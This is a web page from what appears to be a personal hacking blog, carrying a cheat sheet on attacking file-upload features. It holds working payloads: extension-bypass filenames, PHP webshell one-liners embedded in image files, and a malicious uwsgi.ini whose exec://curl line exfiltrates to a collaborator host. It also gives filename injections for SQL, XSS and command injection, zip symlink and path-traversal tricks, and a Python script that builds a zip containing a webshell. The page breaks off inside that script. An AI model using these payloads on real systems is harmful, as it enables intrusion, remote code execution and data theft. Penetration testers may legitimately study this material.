<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> file-upload | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content="Transmitting a file from your computer to another computer."> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚛️</text></svg>" > <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/hacking/cheetsheets/file-upload/file-upload/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">bl0g </a> </li> <li class="nav-item active"> <a class="nav-link" href="/hacking/">h4Cking <span class="sr-only">(current)</span> </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">more </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/repos/">repositories</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/misc/">miscelanea</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/cv/">Cv</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><div class="post"> <header class="post-header"> <h1 class="post-title">file-upload</h1> <p class="post-description">Transmitting a file from your computer to another computer.</p> </header> <article> <p>To transfer (something, such as data or files) from a computer or other digital device to the memory of another device (such as a larger or remote computer) especially via the Internet.</p> <h2 id="file-upload-general-methodology">File Upload General Methodology</h2> <hr/> <p>Other useful extensions:</p> <ul> <li><strong>PHP</strong>: <em>.php</em>, <em>.php2</em>, <em>.php3</em>, .<em>php4</em>, .<em>php5</em>, .<em>php6</em>, .<em>php7</em>, .phps, .<em>pht</em>, .<em>phtm, .phtml</em>, .<em>pgif</em>, <em>.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module</em> <ul> <li><strong>Working in PHPv8</strong>: <em>.php</em>, <em>.php4</em>, <em>.php5</em>, <em>.phtml</em>, <em>.module</em>, <em>.inc</em>, <em>.hphp</em>, <em>.ctp</em></li> </ul> </li> <li><strong>ASP</strong>: <em>.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml</em></li> <li><strong>Jsp:</strong> <em>.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action</em></li> <li><strong>Coldfusion:</strong> <em>.cfm, .cfml, .cfc, .dbm</em></li> <li><strong>Flash</strong>: <em>.swf</em></li> <li><strong>Perl</strong>: <em>.pl, .cgi</em></li> <li><strong>Erlang Yaws Web Server</strong>: <em>.yaws</em></li> </ul> <h3 id="bypass-file-extensions-checks">Bypass file extensions checks</h3> <ol> <li>If they apply, the <strong>check</strong> the <strong>previous extensions.</strong> Also test them using some <strong>uppercase letters</strong>: <em>pHp, .pHP5, .PhAr …</em></li> <li><em>Check <strong>adding a valid extension before</strong> the execution extension (use previous extensions also):</em> <ul> <li><em>file.png.php</em></li> <li><em>file.png.Php5</em></li> </ul> </li> <li>Try adding <strong>special characters at the end.</strong> You could use Burp to <strong>bruteforce</strong> all the <strong>ascii</strong> and <strong>Unicode</strong> characters. (<em>Note that you can also try to use the <strong>previously</strong> motioned <strong>extensions</strong></em>) <ul> <li><em>file.php%20</em></li> <li><em>file.php%0a</em></li> <li><em>file.php%00</em></li> <li><em>file.php%0d%0a</em></li> <li><em>file.php/</em></li> <li><em>file.php.\</em></li> <li><em>file.</em></li> <li><em>file.php….</em></li> <li><em>file.pHp5….</em></li> </ul> </li> <li>Try to bypass the protections <strong>tricking the extension parser</strong> of the server-side with techniques like <strong>doubling</strong> the <strong>extension</strong> or <strong>adding junk</strong> data (<strong>null</strong> bytes) between extensions. <em>You can also use the <strong>previous extensions</strong> to prepare a better payload.</em> <ul> <li><em>file.png.php</em></li> <li><em>file.png.pHp5</em></li> <li><em>file.php#.png</em></li> <li><em>file.php%00.png</em></li> <li><em>file.php\x00.png</em></li> <li><em>file.php%0a.png</em></li> <li><em>file.php%0d%0a.png</em></li> <li><em>file.phpJunk123png</em></li> </ul> </li> <li>Add <strong>another layer of extensions</strong> to the previous check: <ul> <li><em>file.png.jpg.php</em></li> <li><em>file.php%00.png%00.jpg</em></li> </ul> </li> <li>Try to put the <strong>exec extension before the valid extension</strong> and pray so the server is misconfigured. (useful to exploit Apache misconfigurations where anything with extension** <em><strong>.php</strong></em><strong>, but</strong> not necessarily ending in .php** will execute code): <ul> <li><em>ex: file.php.png</em></li> </ul> </li> <li>Using <strong>NTFS alternate data stream (ADS)</strong> in <strong>Windows</strong>. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an <strong>empty file with the forbidden extension</strong> will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “<strong>::$data</strong>” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)</li> <li> <p>Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA&lt;–SNIP–&gt;AAA.php</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA&lt;--SNIP 232 A--&gt;AAA.php.png
</code></pre></div> </div> </li> </ol> <h3 id="bypass-content-type-magic-number-compression--resizing">Bypass Content-Type, Magic Number, Compression &amp; Resizing</h3> <ul> <li>Bypass <strong>Content-Type</strong> checks by setting the <strong>value</strong> of the <strong>Content-Type</strong> <strong>header</strong> to: <em>image/png</em> , <em>text/plain , application/octet-stream</em> <ol> <li>Content-Type <strong>wordlist</strong>: <a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt">https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt</a></li> </ol> </li> <li>Bypass <strong>magic number</strong> check by adding at the beginning of the file the <strong>bytes of a real image</strong> (confuse the <em>file</em> command). Or introduce the shell inside the <strong>metadata</strong>:<br/> <code class="language-plaintext highlighter-rouge">exiftool -Comment="&lt;?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg</code><br/> <code class="language-plaintext highlighter-rouge">\</code> or you could also <strong>introduce the payload directly</strong> in an image:<br/> <code class="language-plaintext highlighter-rouge">echo '&lt;?php system($_REQUEST['cmd']); ?&gt;' &gt;&gt; img.png</code></li> <li>If <strong>compressions is being added to your image</strong>, for example using some standard PHP libraries like <a href="https://www.php.net/manual/fr/book.image.php">PHP-GD</a>, the previous techniques won’t be useful it. However, you could use the <strong>PLTE chunk</strong> <a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html"><strong>technique defined here</strong></a> to insert some text that will <strong>survive compression</strong>. <ul> <li><a href="https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php"><strong>Github with the code</strong></a></li> </ul> </li> <li>The web page cold also be <strong>resizing</strong> the <strong>image</strong>, using for example the PHP-GD functions <code class="language-plaintext highlighter-rouge">imagecopyresized</code> or <code class="language-plaintext highlighter-rouge">imagecopyresampled</code>. However, you could use the <strong>IDAT chunk</strong> <a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html"><strong>technique defined here</strong></a> to insert some text that will <strong>survive compression</strong>. <ul> <li><a href="https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php"><strong>Github with the code</strong></a></li> </ul> </li> <li>Another technique to make a payload that <strong>survives an image resizing</strong>, using the PHP-GD function <code class="language-plaintext highlighter-rouge">thumbnailImage</code>. However, you could use the <strong>tEXt chunk</strong> <a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html"><strong>technique defined here</strong></a> to insert some text that will <strong>survive compression</strong>. <ul> <li><a href="https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php"><strong>Github with the code</strong></a></li> </ul> </li> </ul> <h3 id="other-tricks-to-check">Other Tricks to check</h3> <ul> <li>Find a vulnerability to <strong>rename</strong> the file already uploaded (to change the extension).</li> <li>Find a <strong>Local File Inclusion</strong> vulnerability to execute the backdoor.</li> <li><strong>Possible Information disclosure</strong>: <ol> <li>Upload <strong>several times</strong> (and at the <strong>same time</strong>) the <strong>same file</strong> with the <strong>same name</strong></li> <li>Upload a file with the <strong>name</strong> of a <strong>file</strong> or <strong>folder</strong> that <strong>already exists</strong></li> <li>Uploading a file with <strong>“.”, “..”, or “…” as its name</strong>. For instance, in Apache in <strong>Windows</strong>, if the application saves the uploaded files in “/www/uploads/” directory, the “.” filename will create a file called “uploads” in the “/www/” directory.</li> <li>Upload a file that may not be deleted easily such as <strong>“…:.jpg”</strong> in <strong>NTFS</strong>. (Windows)</li> <li>Upload a file in <strong>Windows</strong> with <strong>invalid characters</strong> such as <code class="language-plaintext highlighter-rouge">|&lt;&gt;*?”</code> in its name. (Windows)</li> <li>Upload a file in <strong>Windows</strong> using <strong>reserved</strong> (<strong>forbidden</strong>) <strong>names</strong> such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.</li> </ol> </li> <li>Try also to <strong>upload an executable</strong> (.exe) or an <strong>.html</strong> (less suspicious) that <strong>will execute code</strong> when accidentally opened by victim.</li> </ul> <h3 id="special-extension-tricks">Special extension tricks</h3> <p>If you are trying to upload files to a <strong>PHP server</strong>, <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution">take a look at the <strong>.htaccess</strong> trick to execute code</a>.<br/> If you are trying to upload files to an <strong>ASP server</strong>, <a href="../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files">take a look at the <strong>.config</strong> trick to execute code</a>.</p> <p>The <code class="language-plaintext highlighter-rouge">.phar</code> files are like the <code class="language-plaintext highlighter-rouge">.jar</code> for java, but for php, and can be <strong>used like a php file</strong> (executing it with php, or including it inside a script…)</p> <p>The <code class="language-plaintext highlighter-rouge">.inc</code> extension is sometimes used for php files that are only used to <strong>import files</strong>, so, at some point, someone could have allow <strong>this extension to be executed</strong>.</p> <h2 id="jetty-rce"><strong>Jetty RCE</strong></h2> <p>If you can upload a XML file into a Jetty server you can obtain <a href="https://twitter.com/ptswarm/status/1555184661751648256/photo/1">RCE because <strong>new *.xml and *.war are automatically processed</strong></a><strong>.</strong> So, as mentioned in the following image, upload the XML file to <code class="language-plaintext highlighter-rouge">$JETTY_BASE/webapps/</code> and expect the shell!</p> <p><img src="../../images/image (1047).png" alt="https://twitter.com/ptswarm/status/1555184661751648256/photo/1"/></p> <h2 id="uwsgi-rce"><strong>uWSGI RCE</strong></h2> <p>For a detailed exploration of this vulnerability check the original research: <a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">uWSGI RCE Exploitation</a>.</p> <p>Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the <code class="language-plaintext highlighter-rouge">.ini</code> configuration file. uWSGI configuration files leverage a specific syntax to incorporate “magic” variables, placeholders, and operators. Notably, the ‘@’ operator, utilized as <code class="language-plaintext highlighter-rouge">@(filename)</code>, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the “exec” scheme is particularly potent, allowing the reading of data from a process’s standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a <code class="language-plaintext highlighter-rouge">.ini</code> configuration file is processed.</p> <p>Consider the following example of a harmful <code class="language-plaintext highlighter-rouge">uwsgi.ini</code> file, showcasing various schemes:</p> <div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[uwsgi]</span>
<span class="c">; read from a symbol
</span><span class="py">foo</span> <span class="p">=</span> <span class="s">@(sym://uwsgi_funny_function)</span>
<span class="c">; read from binary appended data
</span><span class="py">bar</span> <span class="p">=</span> <span class="s">@(data://[REDACTED])</span>
<span class="c">; read from http
</span><span class="py">test</span> <span class="p">=</span> <span class="s">@(http://[REDACTED])</span>
<span class="c">; read from a file descriptor
</span><span class="py">content</span> <span class="p">=</span> <span class="s">@(fd://[REDACTED])</span>
<span class="c">; read from a process stdout
</span><span class="py">body</span> <span class="p">=</span> <span class="s">@(exec://whoami)</span>
<span class="c">; curl to exfil via collaborator
</span><span class="py">extra</span> <span class="p">=</span> <span class="s">@(exec://curl http://collaborator-unique-host.oastify.com)</span>
<span class="c">; call a function returning a char *
</span><span class="py">characters</span> <span class="p">=</span> <span class="s">@(call://uwsgi_func)</span>
</code></pre></div></div> <p>The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.</p> <p>It’s crucial to understand the lax nature of uWSGI’s configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or PDF), further broadening the scope of potential exploitation.</p> <h2 id="wget-file-uploadssrf-trick"><strong>wget File Upload/SSRF Trick</strong></h2> <p>In some occasions you may find that a server is using <strong><code class="language-plaintext highlighter-rouge">wget</code></strong> to <strong>download files</strong> and you can <strong>indicate</strong> the <strong>URL</strong>. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, <strong>this check can be bypassed.</strong><br/> The <strong>maximum</strong> length of a <strong>filename</strong> in <strong>linux</strong> is <strong>255</strong>, however, <strong>wget</strong> truncate the filenames to <strong>236</strong> characters. You can <strong>download a file called “A”*232+”.php”+”.gif”</strong>, this filename will <strong>bypass</strong> the <strong>check</strong> (as in this example <strong>“.gif”</strong> is a <strong>valid</strong> extension) but <code class="language-plaintext highlighter-rouge">wget</code> will <strong>rename</strong> the file to <strong>“A”*232+”.php”</strong>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Create file and HTTP server</span>
<span class="nb">echo</span> <span class="s2">"SOMETHING"</span> <span class="o">&gt;</span> <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*(236-4)+".php"+".gif")'</span><span class="si">)</span>
python3 <span class="nt">-m</span> http.server 9080
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Download the file</span>
wget 127.0.0.1:9080/<span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*(236-4)+".php"+".gif")'</span><span class="si">)</span>
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
<span class="nt">--2020-06-13</span> 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 <span class="o">[</span>image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[<span class="o">===============================================&gt;]</span>      10  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2020-06-13 03:14:06 <span class="o">(</span>1.96 MB/s<span class="o">)</span> - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved <span class="o">[</span>10/10]
</code></pre></div></div> <p>Note that <strong>another option</strong> you may be thinking of to bypass this check is to make the <strong>HTTP server redirect to a different file</strong>, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This <strong>won’t work</strong> <strong>unless</strong> wget is being used with the <strong>parameter</strong> <code class="language-plaintext highlighter-rouge">--trust-server-names</code> because <strong>wget will download the redirected page with the name of the file indicated in the original URL</strong>.</p> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/sAjibuu/Upload_Bypass">Upload Bypass</a> is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.</li> </ul> <h2 id="from-file-upload-to-other-vulnerabilities">From File upload to other vulnerabilities</h2> <ul> <li>Set <strong>filename</strong> to <code class="language-plaintext highlighter-rouge">../../../tmp/lol.png</code> and try to achieve a <strong>path traversal</strong></li> <li>Set <strong>filename</strong> to <code class="language-plaintext highlighter-rouge">sleep(10)-- -.jpg</code> and you may be able to achieve a <strong>SQL injection</strong></li> <li>Set <strong>filename</strong> to <code class="language-plaintext highlighter-rouge">&lt;svg onload=alert(document.domain)&gt;</code> to achieve a XSS</li> <li>Set <strong>filename</strong> to <code class="language-plaintext highlighter-rouge">; sleep 10;</code> to test some command injection (more <a href="../command-injection.md">command injections tricks here</a>)</li> <li><a href="../xss-cross-site-scripting/index.html#xss-uploading-files-svg"><strong>XSS</strong> in image (svg) file upload</a></li> <li><strong>JS</strong> file <strong>upload</strong> + <strong>XSS</strong> = <a href="../xss-cross-site-scripting/index.html#xss-abusing-service-workers"><strong>Service Workers</strong> exploitation</a></li> <li><a href="../xxe-xee-xml-external-entity.md#svg-file-upload"><strong>XXE in svg upload</strong></a></li> <li><a href="../open-redirect.md#open-redirect-uploading-svg-files"><strong>Open Redirect</strong> via uploading svg file</a></li> <li>Try <strong>different svg payloads</strong> from <a href="https://github.com/allanlw/svg-cheatsheet"><strong>https://github.com/allanlw/svg-cheatsheet</strong></a>****</li> <li><a href="https://mukarramkhalid.com/imagemagick-imagetragick-exploit/">Famous <strong>ImageTrick</strong> vulnerability</a></li> <li>If you can <strong>indicate the web server to catch an image from a URL</strong> you could try to abuse a <a href="../ssrf-server-side-request-forgery/index.html">SSRF</a>. If this <strong>image</strong> is going to be <strong>saved</strong> in some <strong>public</strong> site, you could also indicate a URL from <a href="https://iplogger.org/invisible/">https://iplogger.org/invisible/</a> and <strong>steal information of every visitor</strong>.</li> <li><a href="pdf-upload-xxe-and-cors-bypass.md"><strong>XXE and CORS</strong> bypass with PDF-Adobe upload</a></li> <li>Specially crafted PDFs to XSS: The <a href="../xss-cross-site-scripting/pdf-injection.md">following page present how to <strong>inject PDF data to obtain JS execution</strong></a>. If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.</li> <li>Upload the [eicar](<a href="https://secure.eicar.org/eicar.com.txt"><strong>https://secure.eicar.org/eicar.com.txt</strong></a>) content to check if the server has any <strong>antivirus</strong></li> <li>Check if there is any <strong>size limit</strong> uploading files</li> </ul> <p>Here’s a top 10 list of things that you can achieve by uploading (from <a href="https://twitter.com/SalahHasoneh1/status/1281274120395685889">here</a>):</p> <ol> <li><strong>ASP / ASPX / PHP5 / PHP / PHP3</strong>: Webshell / RCE</li> <li><strong>SVG</strong>: Stored XSS / SSRF / XXE</li> <li><strong>GIF</strong>: Stored XSS / SSRF</li> <li><strong>CSV</strong>: CSV injection</li> <li><strong>XML</strong>: XXE</li> <li><strong>AVI</strong>: LFI / SSRF</li> <li><strong>HTML / JS</strong> : HTML injection / XSS / Open redirect</li> <li><strong>PNG / JPEG</strong>: Pixel flood attack (DoS)</li> <li><strong>ZIP</strong>: RCE via LFI / DoS</li> <li><strong>PDF / PPTX</strong>: SSRF / BLIND XXE</li> </ol> <h4 id="burp-extension">Burp Extension</h4> <p>https://github.com/portswigger/upload-scanner</p> <h2 id="magic-header-bytes">Magic Header Bytes</h2> <ul> <li><strong>PNG</strong>: <code class="language-plaintext highlighter-rouge">"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["</code></li> <li><strong>JPG</strong>: <code class="language-plaintext highlighter-rouge">"\xff\xd8\xff"</code></li> </ul> <p>Refer to <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a> for other filetypes.</p> <h3 id="ziptar-file-automatically-decompressed-upload">Zip/Tar File Automatically decompressed Upload</h3> <p>If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:</p> <h4 id="symlink">Symlink</h4> <p>Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
</code></pre></div></div> <h3 id="decompress-in-different-folders">Decompress in different folders</h3> <p>The unexpected creation of files in directories during decompression is a significant issue. Despite initial assumptions that this setup might guard against OS-level command execution through malicious file uploads, the hierarchical compression support and directory traversal capabilities of the ZIP archive format can be exploited. This allows attackers to bypass restrictions and escape secure upload directories by manipulating the decompression functionality of the targeted application.</p> <p>An automated exploit to craft such files is available at <a href="https://github.com/ptoomey3/evilarc"><strong>evilarc on GitHub</strong></a>. The utility can be used as shown:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Listing available options
</span><span class="n">python2</span> <span class="n">evilarc</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span>
<span class="c1"># Creating a malicious archive
</span><span class="n">python2</span> <span class="n">evilarc</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">o</span> <span class="n">unix</span> <span class="o">-</span><span class="n">d</span> <span class="mi">5</span> <span class="o">-</span><span class="n">p</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span> <span class="n">rev</span><span class="p">.</span><span class="n">php</span>
</code></pre></div></div> <p>Additionally, the <strong>symlink trick with evilarc</strong> is an option. If the objective is to target a file like <code class="language-plaintext highlighter-rouge">/flag.txt</code>, a symlink to that file should be created in your system. This ensures that evilarc does not encounter errors during its operation.</p> <p>Below is an example of Python code used to create a malicious zip file:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="n">zipfile</span>
<span class="kn">from</span> <span class="n">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>

<span class="k">def</span> <span class="nf">create_zip</span><span class="p">():</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nc">BytesIO</span><span class="p">()</span>
    <span class="n">z</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="nc">ZipFile</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">,</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span>
    <span class="n">z</span><span class="p">.</span><span class="nf">writestr</span><span class="p">(</span><span class="sh">'</span><span class="s">../../../../../var/www/html/webserver/shell.php</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">&lt;?php echo system($_REQUEST[</span><span class="sh">"</span><span class="s">cmd</span><span class="sh">"</span><span class="s">]); ?&gt;</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">z</span><span class="p">.</span><span class="nf">writestr</span><span class="p">(</span><span class="sh">'</span><span class="s">otherfile.xml</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Content of the file</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">z</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="nb">zip</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">poc.zip</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span>
    <span class="nb">zip</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="nf">getvalue</span><span class="p">())</span>
    <span class="nb">zip</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="nf">create_zip</span><span class="p">()</span>
